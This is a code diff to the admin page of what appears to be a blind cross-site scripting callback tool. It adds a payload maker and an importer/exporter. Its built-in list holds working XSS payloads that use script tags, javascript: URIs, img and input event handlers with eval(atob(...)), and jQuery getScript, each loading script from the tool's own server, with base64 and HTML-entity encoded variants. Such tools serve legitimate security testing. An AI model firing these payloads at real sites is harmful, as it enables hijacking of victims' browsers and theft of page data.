@@ -40,6 +40,20 @@
             width: 97%;
         }
 
+        textarea {
+            padding: 10px;
+            margin-bottom: 20px;
+            border: none;
+            border-radius: 5px;
+            width: 97%;
+            height: 200px;
+        }
+
+        hr {
+            border: 1px solid #ddd;
+            margin: 20px 0;
+        }
+
         .flex-table {
             display: flex;
             flex-direction: column;
@@ -103,6 +117,29 @@
             background-color: #4a7d96;
         }
 
+        .payload_maker_button {
+            background-color: #6497b1;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-right: 10px;
+        }
+
+        .payload_maker_button:hover {
+            /* background-color: #0056b3; */
+            background-color: #4a7d96;
+        }
+
+        .status_good {
+            color: #28a745;
+        }
+
+        .status_bad {
+            color: #dc3545;
+        }
+
         .close_button {
             background-color: #dc3545;
             color: white;
@@ -140,6 +177,7 @@
             padding: 10px;
             padding-bottom: 20px;
             border-bottom: 1px solid #dee2e6;
+            overflow: auto;
         }
 
         .payload_title {
@@ -164,6 +202,8 @@
         .payload_author {
             cursor: pointer;
             text-decoration: underline;
+            margin-bottom: 0px;
+            margin-top: 0px;
         }
 
         .payload_author:hover {
@@ -211,6 +251,45 @@
             /* color: #03396c; */
         }
 
+        .user_payload_header {
+            margin-top: 5px;
+        }
+
+        .payload_legend {
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            margin-bottom: 10px;
+        }
+
+        .user_payloads_legend {
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            /* make it scroll if overflow */
+            overflow: auto;
+        }
+
+        .payload_example {
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            margin-bottom: 10px;
+        }
+
+        .exported_payloads {
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            overflow: auto;
+            cursor: pointer;
+        }
+
+        .exported_payloads:hover {
+            background-color: #00183c;
+        }
     </style>
 </head>
 <body>
@@ -219,6 +298,8 @@
         <button class="navbar" onclick="navbar('collected_pages')">Collected Pages</button>
         <button class="navbar" onclick="navbar('settings')">Settings</button>
         <button class="navbar" onclick="navbar('payloads')">Payloads</button>
+        <button class="navbar" onclick="navbar('payload_maker')">Payload Maker</button>
+        <button class="navbar" onclick="navbar('payload_import_export')">Payload Importer/Exporter</button>
     </div>
     <div id="payload_fires" class="flex-table">
         <h1>Admin Page</h1>
@@ -253,6 +334,12 @@
         <h3 style="margin:0px;">Click Desired Payload to Copy to Clipboard</h3>
         <div id="payloadsTable">
         </div>
+    </div>
+    <div id="payload_maker" class="flex-table invisible">
+        <h1>Payload Maker</h1>
+    </div>
+    <div id="payload_import_export" class="flex-table invisible">
+        <h1>Payload Importer/Exporter</h1>
     </div>
     <script>
         function loadPayloadFires() {
@@ -406,6 +493,13 @@
             }
         });
 
+        const domain = window.location.origin;
+        const hasHTTPS = domain.startsWith('https://');
+        const domainWithoutProtocol = window.location.hostname + (window.location.port ? ':' + window.location.port : '');
+        const domainBase64 = btoa(`var a=document.createElement("script");a.src="${domain}";document.body.appendChild(a);`).replace(/=/g, '');
+        const domainHTMLEncode = "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112" + (hasHTTPS ? ";&#115" : "") + ";&#58;&#47;&#47;" + domainWithoutProtocol + "&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;";
+
+
         function makePayloadsTable() {
             if (state.payloads) {
                 return;
@@ -413,32 +507,256 @@
             state.payloads = 1;
             var payloadsTable = document.getElementById('payloadsTable');
             var payloads = [
-                { title: 'Basic Payload', description: 'This is a basic payload', payload: '%3Cscript%20src%3D%27/script_domain/%27%3E%3C%2Fscript%3E' },
-                { title: 'Javascript URI', description: 'This is a payload that uses a javascript URI', payload: 'javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%5C%27script%5C%5C%27%29%3Ba.src%3D%5C%5C%27/script_domain/%5C%5C%27%3Bdocument.body.appendChild%28a%29%27%29' },
-                { title: 'IMG Error', description: 'Payload triggers on img error', payload: '%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28this.id%29%29%20id%3D%22/script_base64/%22%3E' },
-                { title: 'CSP Bypass', author: '@BRuteLogic', author_link: 'https://twitter.com/BRuteLogic', description: 'Payload against "script-src"', payload: '%3CIframe%20SrcDoc%3D%0A%22%3CScript%20Src%3D/script_domain/%3E%3C%2FScript%3E%22%3E'}
-            ]
+                { title: 'Basic Payload', description: 'This is a basic payload', payload: '%27%22%3Cscript%20src%3D%27/script_domain/%27%3E%3C%2Fscript%3E', is_static: true },
+                { title: 'Javascript URI', description: 'This is a payload that uses a javascript URI', payload: 'javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%5C%27script%5C%5C%27%29%3Ba.src%3D%5C%5C%27/script_domain/%5C%5C%27%3Bdocument.body.appendChild%28a%29%27%29', is_static: true },
+                { title: 'IMG Error', description: 'Payload triggers on img error', payload: '%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28this.id%29%29%20id%3D%22/script_base64/%22%3E', is_static: true },
+                // { title: 'IMG error', description: 'Payload triggers on img error', payload: '%27%22%3E%3Cimg%20src%3Dx%20id%3D/script_base64/%20onerror%3Deval%28atob%28this.id%29%29%3E', is_static: true },
+                { title: 'Input Tag Payload', description: 'HTML5 input-based payload', payload: '%27%22%3E%3Cinput%20onfocus%3Deval%28atob%28this.id%29%29%20id%3D/script_base64/%20autofocus%3E', is_static: true },
+                // { title: 'Video Source Payload', description: 'Video Source payload', payload: '%27%22%3E%3Cvideo%3E%3Csource%20onerror%3Deval%28atob%28this.id%29%29%20id%3D/script_base64/%3E', is_static: true },
+                // { title: 'Iframe with HTML entities', description: 'Iframe that uses HTML Entities', payload: '%27%22%3E%3Ciframe%20srcdoc%3D%22/script_htmlencode/%22%3E', is_static: true },
+                { title: 'Jquery Payload', description: 'Payload exclusive to jquery', payload: '%3Cscript%3E%24.getScript%28%22/script_domain/%22%29%3C%2Fscript%3E', is_static: true },
+                // { title: 'CSP Bypass', author: '@BRuteLogic', author_link: 'https://twitter.com/BRuteLogic', description: 'Payload against "script-src"', payload: '%3CIframe%20SrcDoc%3D%0A%22%3CScript%20Src%3D/script_domain/%3E%3C%2FScript%3E%22%3E'}
+            ];
 
-            payloads.forEach(payload => {
-                var domain = window.location.origin;
-                var domainWithoutProtocol = window.location.hostname + (window.location.port ? ':' + window.location.port : '');
-                var domainBase64 = html_encode(btoa(domain));
-                var processedPayload = payload.payload.replace('/script_domain/', domain);
-                processedPayload = processedPayload.replace('/script_hostname/', domainWithoutProtocol);
-                processedPayload = processedPayload.replace('/script_base64/', domainBase64);
-
-                var URIPayload = decodeURIComponent(processedPayload);
-                var payloadDiv = make_div('payload_div', payloadsTable);
-                make_element('h2', payload.title, payloadDiv, 'payload_title');
-                var description = make_element('p', payload.description, payloadDiv, 'payload_description');
-                if (payload.author) {
-                    var author = make_element('p', `By ${payload.author} `, description, 'payload_author', function() {
-                        window.open(payload.author_link, '_blank');
-                    });
+            fetch('/api/v1/user_payloads', {
+                method: 'GET',
+                headers: {
+                    'Content-Type': 'application/json'
                 }
-                make_element('code', URIPayload, payloadDiv, 'payload_code', function() {
-                    copyToClipboard(URIPayload);
+            })
+            .then(response => response.json())
+            .then(data => {
+                payloads = payloads.concat(data);
+                payloads.forEach(payload => {
+                    var URIPayload = decode_payload(payload.payload);
+                    var payloadDiv = make_div('payload_div', payloadsTable);
+                    make_element('h2', payload.title, payloadDiv, 'payload_title');
+                    var description = make_element('p', payload.description, payloadDiv, 'payload_description');
+                    if (payload.author) {
+                        var author = make_element('p', `By ${payload.author} `, description, 'payload_author', function() {
+                            window.open(payload.author_link, '_blank');
+                        });
+                    }
+                    make_element('code', URIPayload, payloadDiv, 'payload_code', function() {
+                        copyToClipboard(URIPayload);
+                    });
+                    if (!payload.is_static) {
+                        payloadDiv.id = payload.id;
+                        var deleteButton = make_element('button', 'Delete', payloadDiv, 'action_button', function() {
+                            deletePayload(payload.id);
+                        });
+                    }
+
                 });
+            });
+        }
+
+        function encode_payload(payload) {
+            payload = encodeURIComponent(payload);
+            payload = payload.replace('%2Fscript_domain%2F', '/script_domain/');
+            payload = payload.replace('%2Fscript_hostname%2F', '/script_hostname/');
+            payload = payload.replace('%2Fscript_base64%2F', '/script_base64/');
+            payload = payload.replace('%2Fscript_htmlencode%2F', '/script_htmlencode/');
+            return payload;
+        }
+
+        function decode_payload(payload) {
+            processedPayload = payload.replace('/script_domain/', domain);
+            processedPayload = processedPayload.replace('/script_hostname/', domainWithoutProtocol);
+            processedPayload = processedPayload.replace('/script_base64/', domainBase64);
+            processedPayload = processedPayload.replace('/script_htmlencode/', domainHTMLEncode);
+            return decodeURIComponent(processedPayload);
+        }
+
+        function deletePayload(id) {
+            var form_data = new FormData();
+            form_data.append("ids", id);
+
+            fetch('/api/v1/user_payloads', {
+                method: 'DELETE',
+                body: form_data
+            })
+            .then(() => {
+                div = document.getElementById(id);
+                div.remove();
+            });
+        }
+
+        function makePayloadMaker() {
+            if (state.payload_maker) {
+                return;
+            }
+            state.payload_maker = 1;
+            var payloadMaker = document.getElementById('payload_maker');
+
+            payloadLegend = make_div('payload_legend', payloadMaker);
+            make_element('h4', 'Payload Legend', payloadLegend, 'user_payload_header');
+
+            payloadDomain = make_div('user_payloads_legend', payloadLegend);
+            make_element('label', '/script_domain/ becomes ', payloadDomain)
+            make_element('code', domain, payloadDomain);
+
+            payloadHostname = make_div('user_payloads_legend', payloadLegend);
+            make_element('label', '/script_hostname/ becomes ', payloadHostname)
+            make_element('code', domainWithoutProtocol, payloadHostname);
+
+            payloadBase64 = make_div('user_payloads_legend', payloadLegend);
+            make_element('label', '/script_base64/ becomes ', payloadBase64)
+            make_element('code', domainBase64, payloadBase64);
+
+            payloadHTMLEncode = make_div('user_payloads_legend', payloadLegend);
+            make_element('label', '/script_htmlencode/ becomes ', payloadHTMLEncode)
+            make_element('code', domainHTMLEncode, payloadHTMLEncode);
+
+            make_element('p', 'All payloads will become URL encoded when stored in the database and during the making of the payload anything between / and / will be replaced with the appropriate value.', payloadLegend);
+
+            var status_div = make_div('status', payloadMaker);
+            var status = make_element('p', '', status_div);
+
+            var payload_example_div = make_div('payload_example', payloadMaker);
+            make_element('button', 'Copy to Clipboard', payload_example_div, 'payload_maker_button', function() {
+                // Custom function to copy to clipboard based on the id so it has to find the element by id
+                var text = document.getElementById('payload_code').textContent;
+                copyToClipboard(text);
+            });
+            var payload_example = make_element('code', '', payload_example_div);
+            payload_example.id = 'payload_code';
+            
+
+            var payloadMakerForm = make_element('form', null, payloadMaker);
+            payloadMakerForm.id = 'payload_maker_form';
+
+            make_element('button', 'Add /script_domain/', payloadMakerForm, 'payload_maker_button', function(event) {
+                event.preventDefault();
+                var input = payloadMakerForm.getElementsByTagName('input')[0];
+                input.value += '/script_domain/';
+            });
+            make_element('button', 'Add /script_hostname/', payloadMakerForm, 'payload_maker_button', function(event) {
+                event.preventDefault();
+                var input = payloadMakerForm.getElementsByTagName('input')[0];
+                input.value += '/script_hostname/';
+            });
+            make_element('button', 'Add /script_base64/', payloadMakerForm, 'payload_maker_button', function(event) {
+                event.preventDefault();
+                var input = payloadMakerForm.getElementsByTagName('input')[0];
+                input.value += '/script_base64/';
+            });
+            make_element('button', 'Add /script_htmlencode/', payloadMakerForm, 'payload_maker_button', function(event) {
+                event.preventDefault();
+                var input = payloadMakerForm.getElementsByTagName('input')[0];
+                input.value += '/script_htmlencode/';
+            });
+
+            make_element('br', null, payloadMakerForm)
+
+            make_element('label', 'Payload: ', payloadMakerForm);
+            payload_input = make_element('input', null, payloadMakerForm)
+            payload_input.type = 'text';
+            payload_input.id = 'payload_input';
+            payload_input.required = true;
+            payload_input.onchange = function() {
+                console.log('change')
+                var example_payload = encode_payload(payload_input.value);
+                payload_example.textContent = decode_payload(example_payload);
+            }
+
+            make_element('label', 'Title: ', payloadMakerForm);
+            make_element('input', null, payloadMakerForm).type = 'text';
+            make_element('label', 'Description: ', payloadMakerForm);
+            make_element('input', null, payloadMakerForm).type = 'text';
+            make_element('label', 'Author: ', payloadMakerForm);
+            make_element('input', null, payloadMakerForm).type = 'text';
+            make_element('label', 'Author Link: ', payloadMakerForm);
+            make_element('input', null, payloadMakerForm).type = 'text';
+            make_element('input', null, payloadMakerForm, 'action_button').type = 'submit';
+
+            payloadMakerForm.addEventListener('submit', function(event) {
+                event.preventDefault();
+                status.textContent = '';
+                status.className = '';
+                var input = payloadMakerForm.getElementsByTagName('input')[0];
+                if (!input.value) {
+                    status.textContent = 'Payload is required';
+                    status.className = 'status_bad';
+                    return;
+                }
+                var payload = encode_payload(input.value);
+
+                var form_data = new FormData();
+                form_data.append('payload', payload);
+                form_data.append('title', payloadMakerForm.getElementsByTagName('input')[1].value);
+                form_data.append('description', payloadMakerForm.getElementsByTagName('input')[2].value);
+                form_data.append('author', payloadMakerForm.getElementsByTagName('input')[3].value);
+                form_data.append('author_link', payloadMakerForm.getElementsByTagName('input')[4].value);
+
+                fetch('/api/v1/user_payloads', {
+                    method: 'POST',
+                    body: form_data
+                })
+                .then(() => {
+                    status.textContent = 'Payload Added';
+                    status.className = 'status_good';
+                    payload_example.textContent = '';
+                });
+            });
+        }
+
+        function makePayloadImporterExporter() {
+            if (state.payload_import_export) {
+                return;
+            }
+            state.payload_import_export = 1;
+            var payload_import_export = document.getElementById('payload_import_export');
+
+            var payload_import_export_form = make_element('form', null, payload_import_export);
+            payload_import_export_form.id = 'payload_import_export_form';
+
+            make_element('label', 'Import Payloads: ', payload_import_export_form);
+            var import_input = make_element('textarea', null, payload_import_export_form);
+            import_input.required = true;
+
+            make_element('input', null, payload_import_export_form, 'action_button').type = 'submit';
+
+            payload_import_export_form.addEventListener('submit', function(event) {
+                event.preventDefault();
+                var status_div = make_div('status', payload_import_export_form);
+                var status = make_element('p', '', status_div);
+                var input = payload_import_export_form.getElementsByTagName('textarea')[0];
+                fetch('/api/v1/user_payload_importer', {
+                    method: 'POST',
+                    body: input.value
+                })
+                .then(() => {
+                    status.textContent = 'Payloads Imported';
+                    status.className = 'status_good';
+                });
+            });
+
+            make_element('hr', null, payload_import_export);
+
+            var payload_export_button = make_element('button', 'Export Payloads', payload_import_export, 'action_button', function() {
+                fetch('/api/v1/user_payloads', {
+                    method: 'GET',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                })
+                .then(response => response.json())
+                .then(data => {
+                    var exported_payloads = data.map(payload => {
+                        return {
+                            title: payload.title,
+                            description: payload.description,
+                            payload: payload.payload,
+                            author: payload.author,
+                            author_link: payload.author_link
+                        };
+                    });
+                    make_element('br', null, payload_import_export);
+                    make_element('code', JSON.stringify(exported_payloads), payload_import_export, 'exported_payloads', function() {
+                        copyToClipboard(JSON.stringify(exported_payloads));
+                    });
+                })
             });
         }
         
@@ -508,6 +826,8 @@
             collected_pages: 0,
             settings: 0,
             payloads: 0,
+            payload_maker: 0,
+            payload_import_export: 0,
             settings_form: {},
         };
 
@@ -518,6 +838,8 @@
             document.getElementById('collected_pages').style.display = 'none';
             document.getElementById('settings').style.display = 'none';
             document.getElementById('payloads').style.display = 'none';
+            document.getElementById('payload_maker').style.display = 'none';
+            document.getElementById('payload_import_export').style.display = 'none';
 
             switch (page) {
                 case 'payload_fires':
@@ -533,6 +855,14 @@
                 case 'payloads':
                     makePayloadsTable();
                     document.getElementById('payloads').style.display = 'flex';
+                    break;
+                case 'payload_maker':
+                    makePayloadMaker();
+                    document.getElementById('payload_maker').style.display = 'flex';
+                    break;
+                case 'payload_import_export':
+                    makePayloadImporterExporter();
+                    document.getElementById('payload_import_export').style.display = 'flex';
                     break;
                 default:
                     break;
